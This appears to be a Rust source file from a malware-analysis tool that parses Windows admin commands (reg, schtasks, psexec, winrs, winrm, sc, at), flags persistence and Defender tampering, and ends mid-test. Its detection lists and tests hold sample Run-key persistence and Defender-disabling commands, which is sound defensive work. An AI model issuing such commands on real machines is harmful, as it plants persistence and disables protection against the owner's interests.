//! Pass-through admin commands — emits an AdminCommand trait so analysts
//! can filter on these without inspecting the deobfuscated text.

#![allow(clippy::expect_used)]

use crate::env::Environment;
use crate::handlers::util::{split_words, strip_outer_quotes};
use crate::traits::Trait;

macro_rules! make_handler {
    ($fn_name:ident, $cmd_name:literal) => {
        pub fn $fn_name(raw: &str, env: &mut Environment) {
            env.traits.push(Trait::AdminCommand {
                name: $cmd_name.to_string(),
                cmd: raw.to_string(),
            });
        }
    };
}

make_handler!(h_del, "del");
make_handler!(h_cls, "cls");
make_handler!(h_timeout, "timeout");

fn command_token_basename(token: &str) -> String {
    token
        .trim_start_matches(|ch: char| {
            ch.is_ascii_whitespace() || matches!(ch, '@' | '"' | '\'' | '(' | ';' | ',')
        })
        .trim_matches(['"', '\''])
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(token)
        .to_ascii_lowercase()
}

/// `reg add` handler. Pushes the existing AdminCommand trait for backward
/// compat, and additionally emits a Persistence trait when the target key
/// is a well-known Windows autorun hive (Run / RunOnce / RunServices /
/// Userinit / Image File Execution Options). Recognised by a substring
/// match on the lowercased key path.
pub fn h_reg(raw: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    env.traits.push(Trait::AdminCommand {
        name: "reg".to_string(),
        cmd: raw.to_string(),
    });
    let lower = raw.to_ascii_lowercase();
    if !lower.contains("reg") || !lower.contains("add") {
        return;
    }
    // Match `reg add <key> /v <name> /d <data>` — `key` is quoted or
    // unquoted up to the next space/`/v`. `data` extends to end of line
    // (or `/f`/`/t`). Tolerate the optional `.exe` and any flag order.
    static REG_ADD_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)reg(?:\.exe)?\s+add\s+(?:"([^"]+)"|(\S+))"#).expect("reg add regex")
    });
    // Separate regexes for /v and /d so each can scan the rest of the
    // line independently (a single lazy regex would skip the /d match).
    let Some(caps) = REG_ADD_RE.captures(raw) else {
        return;
    };
    let key = caps
        .get(1)
        .or_else(|| caps.get(2))
        .map(|m| m.as_str().to_string())
        .unwrap_or_default();
    if key.is_empty() {
        return;
    }
    let key_lower = key.to_ascii_lowercase();
    let value_name = flag_value(raw, "/v").unwrap_or_default();
    let command = reg_data_value(raw).unwrap_or_default();
    // Defender registry tampering — `reg add …\Windows Defender\… /v
    // Disable…` pattern. AV evasion IOC even when the key isn't a
    // persistence path. d5033dd..., eae19989..., 864eedb8..., 68ee8152...
    // families flip DisableBehaviorMonitoring / DisableAntiSpyware /
    // DisableEnhancedNotifications via this exact form.
    if (key_lower.contains("\\windows defender") || key_lower.contains("/windows defender"))
        && value_name.to_ascii_lowercase().starts_with("disable")
    {
        env.traits.push(Trait::DefenderEvasion {
            action: format!("regset-{}", value_name.to_ascii_lowercase()),
            target: command.clone(),
        });
    }
    // Persistence keys — case-insensitive substring match on the key path.
    const PERSISTENCE_PATHS: &[&str] = &[
        r"\currentversion\run",
        r"\currentversion\runonce",
        r"\currentversion\runservices",
        r"\currentversion\runservicesonce",
        r"\currentversion\explorer\run",
        r"\currentversion\policies\explorer\run",
        r"\currentversion\shell\open\command",
        r"\winlogon\userinit",
        r"\winlogon\shell",
        r"\image file execution options\",
        r"\currentversion\app paths\",
        r"\currentversion\winlogon\shell",
    ];
    let value_lower = value_name.to_ascii_lowercase();
    let winlogon_value_persistence =
        key_lower.contains("\\winlogon") && matches!(value_lower.as_str(), "shell" | "userinit");
    if !winlogon_value_persistence && !PERSISTENCE_PATHS.iter().any(|p| key_lower.contains(p)) {
        return;
    }
    // Split hive from sub-key for clarity.
    let (hive, subkey) = if let Some(idx) = key.find('\\') {
        (key[..idx].to_string(), key[idx + 1..].to_string())
    } else {
        (key.clone(), String::new())
    };
    env.traits.push(Trait::Persistence {
        hive,
        key: subkey,
        value_name,
        command: command.clone(),
    });
    queue_registry_persisted_command(command, env);
}

fn reg_data_value(raw: &str) -> Option<String> {
    let spans = split_word_spans(raw);
    for (idx, span) in spans.iter().enumerate() {
        let raw_token = &raw[span.clone()];
        let normalized_token = raw_token.trim_matches(['"', '\'']);
        if normalized_token.eq_ignore_ascii_case("/d") {
            let value_span = spans.get(idx + 1)?;
            let value_start = value_span.start;
            let value = raw[value_start..].trim_start();
            if value.starts_with(['"', '\'']) {
                return parse_flag_value(raw, value_start);
            }
            let value_end = reg_unquoted_value_end(raw, &spans[idx + 1..]);
            return Some(raw[value_start..value_end].trim_end().to_string());
        }
        let lower = raw_token.to_ascii_lowercase();
        if let Some(rest) = lower
            .strip_prefix("/d:")
            .or_else(|| lower.strip_prefix("/d="))
        {
            if rest.is_empty() {
                continue;
            }
            let value_start = span.end - rest.len();
            let value = raw[value_start..].trim_start();
            if value.starts_with(['"', '\'']) {
                return parse_flag_value(raw, value_start);
            }
            let value_end = reg_unquoted_value_end(raw, &spans[idx..]);
            return Some(raw[value_start..value_end].trim_end().to_string());
        }
    }
    None
}

fn reg_unquoted_value_end(raw: &str, value_spans: &[std::ops::Range<usize>]) -> usize {
    for span in value_spans.iter().skip(1) {
        let token = raw[span.clone()].trim_matches(['"', '\'']);
        if reg_option_token(token) {
            return span.start;
        }
    }
    value_spans.last().map_or(raw.len(), |span| span.end)
}

fn reg_option_token(token: &str) -> bool {
    let lower = token.to_ascii_lowercase();
    matches!(
        lower.as_str(),
        "/v" | "/ve" | "/t" | "/s" | "/f" | "/reg:32" | "/reg:64"
    )
}

make_handler!(h_attrib, "attrib");
make_handler!(h_mkdir, "mkdir");
make_handler!(h_md, "md");
make_handler!(h_move, "move");
make_handler!(h_rmdir, "rmdir");
make_handler!(h_rd, "rd");
make_handler!(h_taskkill, "taskkill");
make_handler!(h_tasklist, "tasklist");
/// `schtasks` handler. Pushes AdminCommand; if the invocation creates or
/// changes a scheduled task action (`schtasks /create|/change /tn X /tr Y`), also emits a
/// Persistence trait — scheduled tasks are a primary autorun mechanism.
pub fn h_schtasks(raw: &str, env: &mut Environment) {
    env.traits.push(Trait::AdminCommand {
        name: "schtasks".to_string(),
        cmd: raw.to_string(),
    });
    let lower = raw.to_ascii_lowercase();
    let is_create = lower.contains("/create");
    let is_change = lower.contains("/change");
    if !is_create && !is_change {
        return;
    }
    let task_name = flag_value(raw, "/tn").unwrap_or_default();
    let task_run = schtasks_task_run(raw).or_else(|| {
        is_create
            .then(|| flag_value_separated(raw, "/xml").map(|path| format!("xml:{path}")))
            .flatten()
    });
    let task_run = if is_change {
        let Some(task_run) = task_run else {
            return;
        };
        task_run
    } else {
        task_run.unwrap_or_default()
    };
    env.traits.push(Trait::Persistence {
        hive: "ScheduledTask".to_string(),
        key: task_name,
        value_name: String::new(),
        command: task_run.clone(),
    });
    queue_registry_persisted_command(task_run, env);
}

/// `runas` launches a command under another account or elevation context.
/// Treat the launched program as self-elevation and replay the child command
/// so nested `cmd /c`, PowerShell, or LOLBin payloads are still analyzed.
pub fn h_runas(raw: &str, env: &mut Environment) {
    let Some(command) = runas_child_command(raw) else {
        return;
    };
    if let Some((target, args)) = command_target_and_args(&command) {
        env.traits.push(Trait::SelfElevation {
            target,
            args: args.filter(|value| !value.is_empty()),
        });
    }
    queue_child_command(command, env);
}

pub fn h_psexec(raw: &str, env: &mut Environment) {
    let Some((_host, command)) = psexec_child_command(raw) else {
        return;
    };
    queue_child_command(command, env);
}

pub fn h_winrs(raw: &str, env: &mut Environment) {
    let Some((_host, command)) = winrs_child_command(raw) else {
        return;
    };
    queue_child_command(command, env);
}

pub fn h_winrm(raw: &str, env: &mut Environment) {
    let Some((_host, command)) = winrm_child_command(raw) else {
        return;
    };
    queue_child_command(command, env);
}

pub(crate) fn runas_child_command(raw: &str) -> Option<String> {
    let spans = split_word_spans(raw);
    let first = spans.first()?;
    let command_name = command_token_basename(&raw[first.clone()]);
    if command_name.strip_suffix(".exe").unwrap_or(&command_name) != "runas" {
        return None;
    }

    let mut idx = 1usize;
    while let Some(span) = spans.get(idx) {
        let token = raw[span.clone()].trim_matches(['"', '\'']);
        let lower = token.to_ascii_lowercase();
        if lower == "/user" || lower == "/trustlevel" {
            idx += 2;
            continue;
        }
        if lower.starts_with("/user:") || lower.starts_with("/trustlevel:") {
            idx += 1;
            continue;
        }
        if matches!(
            lower.as_str(),
            "/profile"
                | "/noprofile"
                | "/env"
                | "/netonly"
                | "/savecred"
                | "/smartcard"
                | "/showtrustlevels"
        ) {
            idx += 1;
            continue;
        }
        break;
    }

    let command_start = spans.get(idx)?.start;
    let command = strip_outer_quotes(raw[command_start..].trim()).trim();
    (!command.is_empty()).then(|| command.to_string())
}

pub(crate) fn psexec_child_command(raw: &str) -> Option<(String, String)> {
    let spans = split_word_spans(raw);
    let first = spans.first()?;
    let command_name = command_token_basename(&raw[first.clone()]);
    if command_name.strip_suffix(".exe").unwrap_or(&command_name) != "psexec" {
        return None;
    }

    let mut idx = 1usize;
    let mut host = None;
    while let Some(span) = spans.get(idx) {
        let token = raw[span.clone()].trim_matches(['"', '\'']);
        if token.starts_with("\\\\") {
            host = Some(token.trim_start_matches('\\').to_string());
            idx += 1;
            break;
        }
        idx += psexec_option_span_width(token, true)?;
    }
    let host = host?;

    while let Some(span) = spans.get(idx) {
        let token = raw[span.clone()].trim_matches(['"', '\'']);
        if token.starts_with("\\\\") {
            idx += 1;
            continue;
        }
        let Some(width) = psexec_option_span_width(token, false) else {
            break;
        };
        idx += width;
    }

    let command_start = spans.get(idx)?.start;
    let command = strip_outer_quotes(raw[command_start..].trim()).trim();
    (!command.is_empty()).then(|| (host, command.to_string()))
}

pub(crate) fn winrm_child_command(raw: &str) -> Option<(String, String)> {
    let spans = split_word_spans(raw);
    let first = spans.first()?;
    let command_name = command_token_basename(&raw[first.clone()]);
    let command_name = command_name
        .strip_suffix(".cmd")
        .or_else(|| command_name.strip_suffix(".exe"))
        .unwrap_or(&command_name);
    if command_name != "winrm" {
        return None;
    }

    let mut host = None;
    for (idx, span) in spans.iter().enumerate().skip(1) {
        let token = raw[span.clone()].trim_matches(['"', '\'']);
        let lower = token.to_ascii_lowercase();
        if lower == "-r" || lower == "/r" || lower == "-remote" || lower == "/remote" {
            let host_span = spans.get(idx + 1)?;
            host = Some(strip_outer_quotes(&raw[host_span.clone()]).to_string());
            break;
        }
        if let Some(value) = lower
            .strip_prefix("-r:")
            .or_else(|| lower.strip_prefix("-r="))
            .or_else(|| lower.strip_prefix("/r:"))
            .or_else(|| lower.strip_prefix("/r="))
            .or_else(|| lower.strip_prefix("-remote:"))
            .or_else(|| lower.strip_prefix("-remote="))
            .or_else(|| lower.strip_prefix("/remote:"))
            .or_else(|| lower.strip_prefix("/remote="))
        {
            let value_start = span.end - value.len();
            host = Some(strip_outer_quotes(&raw[value_start..span.end]).to_string());
            break;
        }
    }

    let host = host?.trim_matches(['"', '\'']).to_string();
    if host.is_empty() {
        return None;
    }
    let command = winrm_commandline_value(raw)?;
    Some((host, command))
}

fn winrm_commandline_value(raw: &str) -> Option<String> {
    let marker = ascii_case_find(raw, "CommandLine")?;
    let mut idx = marker + "CommandLine".len();
    let bytes = raw.as_bytes();
    while bytes.get(idx).is_some_and(u8::is_ascii_whitespace) {
        idx += 1;
    }
    if bytes.get(idx) != Some(&b'=') {
        return None;
    }
    idx += 1;
    while bytes.get(idx).is_some_and(u8::is_ascii_whitespace) {
        idx += 1;
    }
    parse_flag_value(raw, idx)
}

fn ascii_case_find(haystack: &str, needle: &str) -> Option<usize> {
    let needle_len = needle.len();
    if needle_len == 0 || haystack.len() < needle_len {
        return None;
    }
    for idx in haystack.char_indices().map(|(idx, _)| idx) {
        let Some(candidate) = haystack.get(idx..idx + needle_len) else {
            continue;
        };
        if candidate.eq_ignore_ascii_case(needle) {
            return Some(idx);
        }
    }
    None
}

pub(crate) fn winrs_child_command(raw: &str) -> Option<(String, String)> {
    let spans = split_word_spans(raw);
    let first = spans.first()?;
    let command_name = command_token_basename(&raw[first.clone()]);
    if command_name.strip_suffix(".exe").unwrap_or(&command_name) != "winrs" {
        return None;
    }

    let mut idx = 1usize;
    let mut host = None;
    while let Some(span) = spans.get(idx) {
        let token = raw[span.clone()].trim_matches(['"', '\'']);
        let lower = token.to_ascii_lowercase();
        if lower == "-r" || lower == "/r" || lower == "-remote" || lower == "/remote" {
            let host_span = spans.get(idx + 1)?;
            host = Some(strip_outer_quotes(&raw[host_span.clone()]).to_string());
            idx += 2;
            continue;
        }
        if let Some(value) = lower
            .strip_prefix("-r:")
            .or_else(|| lower.strip_prefix("-r="))
            .or_else(|| lower.strip_prefix("/r:"))
            .or_else(|| lower.strip_prefix("/r="))
            .or_else(|| lower.strip_prefix("-remote:"))
            .or_else(|| lower.strip_prefix("-remote="))
            .or_else(|| lower.strip_prefix("/remote:"))
            .or_else(|| lower.strip_prefix("/remote="))
        {
            let value_start = span.end - value.len();
            host = Some(strip_outer_quotes(&raw[value_start..span.end]).to_string());
            idx += 1;
            continue;
        }
        let Some(width) = winrs_option_span_width(token, host.is_none()) else {
            break;
        };
        idx += width;
    }

    let host = host?.trim_matches(['"', '\'']).to_string();
    if host.is_empty() {
        return None;
    }
    let command_start = spans.get(idx)?.start;
    let command = strip_outer_quotes(raw[command_start..].trim()).trim();
    (!command.is_empty()).then(|| (host, command.to_string()))
}

fn winrs_option_span_width(token: &str, before_host: bool) -> Option<usize> {
    let lower = token.to_ascii_lowercase();
    let option = lower.strip_prefix(['-', '/'])?;
    if option.is_empty() {
        return None;
    }
    if matches!(
        option,
        "u" | "username" | "p" | "password" | "a" | "encoding"
    ) {
        return Some(2);
    }
    if option.starts_with("u:")
        || option.starts_with("u=")
        || option.starts_with("username:")
        || option.starts_with("username=")
        || option.starts_with("p:")
        || option.starts_with("p=")
        || option.starts_with("password:")
        || option.starts_with("password=")
        || option.starts_with("a:")
        || option.starts_with("a=")
        || option.starts_with("encoding:")
        || option.starts_with("encoding=")
    {
        return Some(1);
    }
    if matches!(
        option,
        "unencrypted" | "usessl" | "skipcncheck" | "skipcacheck" | "skiprevocationcheck"
    ) {
        return Some(1);
    }
    before_host.then_some(1)
}

fn psexec_option_span_width(token: &str, before_host: bool) -> Option<usize> {
    let lower = token.to_ascii_lowercase();
    if lower.is_empty() {
        return Some(1);
    }
    let option = lower.strip_prefix(['-', '/'])?;
    if option.is_empty() {
        return None;
    }
    if matches!(
        option,
        "u" | "p" | "n" | "i" | "w" | "r" | "a" | "g" | "priority"
    ) {
        return Some(2);
    }
    if option.starts_with('u')
        || option.starts_with('p')
        || option.starts_with('n')
        || option.starts_with('i')
        || option.starts_with('w')
        || option.starts_with('r')
        || option.starts_with('a')
        || option.starts_with('g')
    {
        return Some(1);
    }
    if matches!(
        option,
        "accepteula"
            | "nobanner"
            | "s"
            | "h"
            | "d"
            | "c"
            | "f"
            | "v"
            | "e"
            | "l"
            | "x"
            | "realtime"
            | "high"
            | "abovenormal"
            | "belownormal"
            | "low"
            | "background"
    ) {
        return Some(1);
    }
    before_host.then_some(1)
}

fn command_target_and_args(command: &str) -> Option<(String, Option<String>)> {
    let spans = split_word_spans(command);
    let target_span = spans.first()?;
    let target = strip_outer_quotes(&command[target_span.clone()]).to_string();
    if target.is_empty() {
        return None;
    }
    let args = command[target_span.end..].trim();
    Some((
        target,
        (!args.is_empty()).then(|| strip_outer_quotes(args).to_string()),
    ))
}

fn schtasks_task_run(raw: &str) -> Option<String> {
    let spans = split_word_spans(raw);
    for (idx, span) in spans.iter().enumerate() {
        let raw_token = &raw[span.clone()];
        let normalized_token = raw_token.trim_matches(['"', '\'']);
        if normalized_token.eq_ignore_ascii_case("/tr") {
            let value_span = spans.get(idx + 1)?;
            let value_start = value_span.start;
            let value = raw[value_start..].trim_start();
            if value.starts_with(['"', '\'']) {
                return parse_flag_value(raw, value_start);
            }
            let value_end = schtasks_unquoted_value_end(raw, &spans[idx + 1..]);
            return Some(raw[value_start..value_end].trim_end().to_string());
        }
        if let Some(value_start) = attached_flag_value_start(raw_token, "/tr") {
            let value_start = span.start + value_start;
            let value = raw[value_start..].trim_start();
            if value.starts_with(['"', '\'']) {
                return parse_flag_value(raw, value_start);
            }
            let value_end = schtasks_unquoted_value_end(raw, &spans[idx..]);
            return Some(raw[value_start..value_end].trim_end().to_string())
                .filter(|command| persisted_command_looks_dispatchable(command));
        }
    }
    None
}

fn attached_flag_value_start(token: &str, flag: &str) -> Option<usize> {
    let marker_len = flag.len();
    if token.len() <= marker_len {
        return None;
    }
    let marker = token.get(..marker_len)?;
    let delimiter = token.as_bytes().get(marker_len).copied()?;
    if marker.eq_ignore_ascii_case(flag) && matches!(delimiter, b':' | b'=') {
        Some(marker_len + 1)
    } else {
        None
    }
}

fn schtasks_unquoted_value_end(raw: &str, value_spans: &[std::ops::Range<usize>]) -> usize {
    for span in value_spans.iter().skip(1) {
        let token = raw[span.clone()].trim_matches(['"', '\'']);
        if schtasks_option_token(token) {
            return span.start;
        }
    }
    value_spans.last().map_or(raw.len(), |span| span.end)
}

fn schtasks_option_token(token: &str) -> bool {
    matches!(
        token.to_ascii_lowercase().as_str(),
        "/create"
            | "/change"
            | "/delete"
            | "/query"
            | "/run"
            | "/end"
            | "/tn"
            | "/sc"
            | "/mo"
            | "/d"
            | "/m"
            | "/i"
            | "/st"
            | "/ri"
            | "/et"
            | "/du"
            | "/k"
            | "/sd"
            | "/ed"
            | "/ec"
            | "/it"
            | "/np"
            | "/z"
            | "/f"
            | "/ru"
            | "/rp"
            | "/rl"
            | "/delay"
            | "/hresult"
            | "/xml"
            | "/v"
            | "/fo"
            | "/nh"
            | "/s"
            | "/u"
            | "/p"
    )
}

fn flag_value(raw: &str, flag: &str) -> Option<String> {
    let mut i = 0usize;
    let bytes = raw.as_bytes();
    while i < raw.len() {
        while bytes.get(i).is_some_and(u8::is_ascii_whitespace) {
            i += 1;
        }
        if i >= raw.len() {
            break;
        }
        if raw[i..]
            .get(..flag.len())
            .is_some_and(|candidate| candidate.eq_ignore_ascii_case(flag))
        {
            let value_start = i + flag.len();
            match bytes.get(value_start) {
                Some(b':') | Some(b'=') => return parse_flag_value(raw, value_start + 1),
                Some(b) if b.is_ascii_whitespace() => {
                    i = value_start;
                    while bytes.get(i).is_some_and(u8::is_ascii_whitespace) {
                        i += 1;
                    }
                    return parse_flag_value(raw, i);
                }
                None => return None,
                _ => {}
            }
        }
        i = next_arg_start(raw, i);
    }
    None
}

fn flag_value_separated(raw: &str, flag: &str) -> Option<String> {
    let mut i = 0usize;
    let bytes = raw.as_bytes();
    while i < raw.len() {
        while bytes.get(i).is_some_and(u8::is_ascii_whitespace) {
            i += 1;
        }
        if i >= raw.len() {
            break;
        }
        if raw[i..]
            .get(..flag.len())
            .is_some_and(|candidate| candidate.eq_ignore_ascii_case(flag))
            && bytes
                .get(i + flag.len())
                .is_some_and(u8::is_ascii_whitespace)
        {
            i += flag.len();
            while bytes.get(i).is_some_and(u8::is_ascii_whitespace) {
                i += 1;
            }
            return parse_flag_value(raw, i);
        }
        i = next_arg_start(raw, i);
    }
    None
}

fn next_arg_start(raw: &str, mut i: usize) -> usize {
    let bytes = raw.as_bytes();
    let quote = bytes.get(i).copied().filter(|b| *b == b'"' || *b == b'\'');
    if let Some(quote) = quote {
        i += 1;
        while i < raw.len() {
            if bytes[i] == quote {
                return i + 1;
            }
            i += 1;
        }
        return raw.len();
    }
    while i < raw.len() && !bytes[i].is_ascii_whitespace() {
        i += 1;
    }
    i
}

fn parse_flag_value(raw: &str, start: usize) -> Option<String> {
    let bytes = raw.as_bytes();
    let mut start = start;
    while bytes.get(start).is_some_and(u8::is_ascii_whitespace) {
        start += 1;
    }
    let quote = *bytes.get(start)?;
    if quote == b'"' || quote == b'\'' {
        let quote_char = quote as char;
        let mut out = String::new();
        let mut i = start + 1;
        while i < raw.len() {
            let Some(ch) = raw[i..].chars().next() else {
                break;
            };
            if ch == '\\'
                && bytes.get(i + 1) == Some(&quote)
                && has_later_unescaped_quote(bytes, i + 2, quote)
            {
                out.push(quote_char);
                i += 2;
                continue;
            }
            if ch == quote_char {
                return Some(out);
            }
            out.push(ch);
            i += ch.len_utf8();
        }
        return Some(out);
    }
    let end = raw[start..]
        .find(char::is_whitespace)
        .map(|offset| start + offset)
        .unwrap_or(raw.len());
    Some(raw[start..end].to_string())
}

fn has_later_unescaped_quote(bytes: &[u8], mut start: usize, quote: u8) -> bool {
    while start < bytes.len() {
        if bytes[start] == quote && (start == 0 || bytes.get(start - 1) != Some(&b'\\')) {
            return true;
        }
        start += 1;
    }
    false
}

fn queue_registry_persisted_command(command: String, env: &mut Environment) {
    if !persisted_command_looks_dispatchable(&command) {
        return;
    }
    queue_child_command(command, env);
}

fn queue_child_command(command: String, env: &mut Environment) {
    if command.is_empty() {
        return;
    }
    if let Some((child, delayed)) = persisted_command_child(&command) {
        env.exec_cmd.push(child);
        env.exec_cmd_delayed.push(delayed);
    }
}

fn persisted_command_looks_dispatchable(command: &str) -> bool {
    let trimmed = command.trim().trim_matches('"');
    if trimmed.is_empty() || trimmed.ends_with('\\') || trimmed.ends_with('/') {
        return false;
    }
    trimmed.bytes().any(|b| b.is_ascii_whitespace())
}

pub(crate) fn persisted_command_child(command: &str) -> Option<(String, bool)> {
    if let Some(inner) = super::cmd::extract_cmd_inner(command) {
        return Some((inner, super::cmd::has_v_on_raw(command)));
    }
    if persisted_command_looks_dispatchable(command) {
        return Some((command.to_string(), false));
    }
    None
}

pub(crate) fn sc_service_binpath(raw: &str) -> Option<(String, String)> {
    let (subcommand, service_name) = sc_subcommand_and_service(raw)?;
    if !matches!(subcommand.as_str(), "create" | "config") {
        return None;
    }
    let bin_path = sc_flag_value(raw, "binPath")?;
    Some((service_name, bin_path))
}

pub(crate) fn sc_failure_command(raw: &str) -> Option<(String, String)> {
    let (subcommand, service_name) = sc_subcommand_and_service(raw)?;
    if subcommand != "failure" {
        return None;
    }
    let command = sc_flag_value(raw, "command")?;
    Some((service_name, command))
}

fn sc_flag_value(raw: &str, flag: &str) -> Option<String> {
    let spans = split_word_spans(raw);
    for (idx, span) in spans.iter().enumerate() {
        let raw_token = &raw[span.clone()];
        let normalized_token = raw_token.trim_matches(['"', '\'']);
        if normalized_token.eq_ignore_ascii_case(flag) {
            let value_span = spans.get(idx + 1)?;
            return sc_value_from_start(raw, value_span.start, &spans[idx + 1..]);
        }
        let Some(value_start) = sc_attached_value_start(raw_token, flag) else {
            continue;
        };
        let value_start = span.start + value_start;
        let value_spans = if value_start >= span.end {
            &spans[idx + 1..]
        } else {
            &spans[idx..]
        };
        return sc_value_from_start(raw, value_start, value_spans);
    }
    None
}

fn sc_attached_value_start(token: &str, flag: &str) -> Option<usize> {
    let marker = token.get(..flag.len())?;
    if !marker.eq_ignore_ascii_case(flag) {
        return None;
    }
    let delimiter = token.as_bytes().get(flag.len()).copied()?;
    matches!(delimiter, b'=' | b':').then_some(flag.len() + 1)
}

fn sc_value_from_start(
    raw: &str,
    value_start: usize,
    value_spans: &[std::ops::Range<usize>],
) -> Option<String> {
    let value = raw[value_start..].trim_start();
    if value.starts_with(['"', '\'']) {
        return parse_flag_value(raw, value_start);
    }
    let value_end = sc_unquoted_value_end(raw, value_spans);
    Some(raw[value_start..value_end].trim_end().to_string()).filter(|value| !value.is_empty())
}

fn sc_unquoted_value_end(raw: &str, value_spans: &[std::ops::Range<usize>]) -> usize {
    for span in value_spans.iter().skip(1) {
        let token = raw[span.clone()].trim_matches(['"', '\'']);
        if sc_option_token(token) {
            return span.start;
        }
    }
    value_spans.last().map_or(raw.len(), |span| span.end)
}

fn sc_option_token(token: &str) -> bool {
    let Some((name, _)) = token.split_once(['=', ':']) else {
        return false;
    };
    matches!(
        name.to_ascii_lowercase().as_str(),
        "type"
            | "start"
            | "error"
            | "binpath"
            | "group"
            | "tag"
            | "depend"
            | "obj"
            | "displayname"
            | "password"
            | "reset"
            | "reboot"
            | "command"
            | "actions"
    )
}

fn sc_subcommand_and_service(raw: &str) -> Option<(String, String)> {
    let tokens = split_words(raw);
    let command = tokens.first()?;
    let name = command_token_basename(command);
    if name.strip_suffix(".exe").unwrap_or(&name) != "sc" {
        return None;
    }
    let subcommand_index = if tokens.get(1).is_some_and(|token| token.starts_with(r"\\")) {
        2
    } else {
        1
    };
    let subcommand = tokens.get(subcommand_index)?.to_ascii_lowercase();
    let service_name = tokens
        .get(subcommand_index + 1)
        .map(|token| strip_outer_quotes(token).to_string())
        .filter(|token| !token.is_empty())?;
    Some((subcommand, service_name))
}

pub(crate) fn at_scheduled_command(raw: &str) -> Option<(String, String)> {
    let spans = split_word_spans(raw);
    let first = spans.first()?;
    let command_name = command_token_basename(&raw[first.clone()]);
    if command_name.strip_suffix(".exe").unwrap_or(&command_name) != "at" {
        return None;
    }

    let mut idx = 1usize;
    if spans
        .get(idx)
        .is_some_and(|span| raw[span.clone()].starts_with("\\\\"))
    {
        idx += 1;
    }
    let time_span = spans.get(idx)?;
    let time = raw[time_span.clone()].trim_matches(['"', '\'']);
    if !at_token_looks_like_time(time) {
        return None;
    }
    idx += 1;
    while let Some(span) = spans.get(idx) {
        let token = raw[span.clone()]
            .trim_matches(['"', '\''])
            .to_ascii_lowercase();
        if token == "/interactive" || token.starts_with("/every:") || token.starts_with("/next:") {
            idx += 1;
            continue;
        }
        break;
    }
    let command_start = spans.get(idx)?.start;
    let command = raw[command_start..].trim();
    if command.is_empty() {
        return None;
    }
    Some((time.to_string(), command.to_string()))
}

fn at_token_looks_like_time(token: &str) -> bool {
    let lower = token.to_ascii_lowercase();
    lower == "now" || lower.contains(':')
}

fn split_word_spans(raw: &str) -> Vec<std::ops::Range<usize>> {
    let mut out = Vec::new();
    let mut start = None;
    let mut quote = None;
    for (idx, ch) in raw.char_indices() {
        if start.is_none() {
            if ch.is_whitespace() {
                continue;
            }
            start = Some(idx);
        }
        if matches!(ch, '"' | '\'') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
            continue;
        }
        if ch.is_whitespace() && quote.is_none() {
            if let Some(start_idx) = start.take() {
                out.push(start_idx..idx);
            }
        }
    }
    if let Some(start_idx) = start {
        out.push(start_idx..raw.len());
    }
    out
}

make_handler!(h_sc, "sc");
make_handler!(h_at, "at");
make_handler!(h_ping, "ping");
make_handler!(h_xcopy, "xcopy");
make_handler!(h_title, "title");
make_handler!(h_pause, "pause");
make_handler!(h_color, "color");
make_handler!(h_doskey, "doskey");
make_handler!(h_chcp, "chcp");
make_handler!(h_ver, "ver");
make_handler!(h_whoami, "whoami");

#[cfg(test)]
#[allow(clippy::expect_used, clippy::panic)]
mod tests {
    use super::{
        at_scheduled_command, h_reg, h_schtasks, persisted_command_child, psexec_child_command,
        reg_data_value, runas_child_command, sc_failure_command, sc_service_binpath,
        schtasks_task_run, winrm_child_command, winrs_child_command,
    };
    use crate::env::{Config, Environment};
    use crate::traits::Trait;

    #[test]
    fn schtasks_colon_bound_task_run_is_persisted_and_queued() {
        let mut env = Environment::new(&Config::default());
        h_schtasks(
            r#"schtasks /create /tn:Updater /tr:"cmd.exe /c echo colon-task" /sc once"#,
            &mut env,
        );

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::Persistence { hive, key, command, .. }
                    if hive == "ScheduledTask"
                        && key == "Updater"
                        && command == "cmd.exe /c echo colon-task"
            )),
            "colon-bound /tr was not persisted: {:?}",
            env.traits
        );
        assert!(
            env.exec_cmd.iter().any(|cmd| cmd == "echo colon-task"),
            "colon-bound /tr child was not queued: {:?}",
            env.exec_cmd
        );
    }

    #[test]
    fn schtasks_attached_flags_are_case_insensitive() {
        let mut env = Environment::new(&Config::default());
        h_schtasks(
            r#"schtasks /Create /Tn:Updater /Tr:"cmd.exe /c echo mixed-case-task" /Sc once"#,
            &mut env,
        );

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::Persistence { hive, key, command, .. }
                    if hive == "ScheduledTask"
                        && key == "Updater"
                        && command == "cmd.exe /c echo mixed-case-task"
            )),
            "mixed-case attached schtasks flags were not persisted: {:?}",
            env.traits
        );
        assert!(
            env.exec_cmd.iter().any(|cmd| cmd == "echo mixed-case-task"),
            "mixed-case attached /Tr child was not queued: {:?}",
            env.exec_cmd
        );
    }

    #[test]
    fn reg_add_equals_bound_data_is_persisted_and_queued() {
        let mut env = Environment::new(&Config::default());
        h_reg(
            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d="cmd.exe /c echo reg-equals" /f"#,
            &mut env,
        );

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::Persistence { hive, command, .. }
                    if hive == "HKCU" && command == "cmd.exe /c echo reg-equals"
            )),
            "equals-bound /d was not persisted: {:?}",
            env.traits
        );
        assert!(
            env.exec_cmd.iter().any(|cmd| cmd == "echo reg-equals"),
            "equals-bound /d child was not queued: {:?}",
            env.exec_cmd
        );
    }

    #[test]
    fn reg_data_value_collects_unquoted_command_until_next_reg_option() {
        let command = reg_data_value(
            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d cmd.exe /c echo hi /f"#,
        )
        .expect("reg data should parse");

        assert_eq!(command, "cmd.exe /c echo hi");
    }

    #[test]
    fn reg_data_value_collects_attached_unquoted_command_until_next_reg_option() {
        let command = reg_data_value(
            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d=cmd.exe /c echo hi /f"#,
        )
        .expect("attached reg data should parse");

        assert_eq!(command, "cmd.exe /c echo hi");
    }

    #[test]
    fn reg_data_value_stops_numeric_value_before_force_option() {
        let command = reg_data_value(
            r#"reg add HKLM\Software\Microsoft\Windows Defender /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f"#,
        )
        .expect("numeric reg data should parse");

        assert_eq!(command, "1");
    }

    #[test]
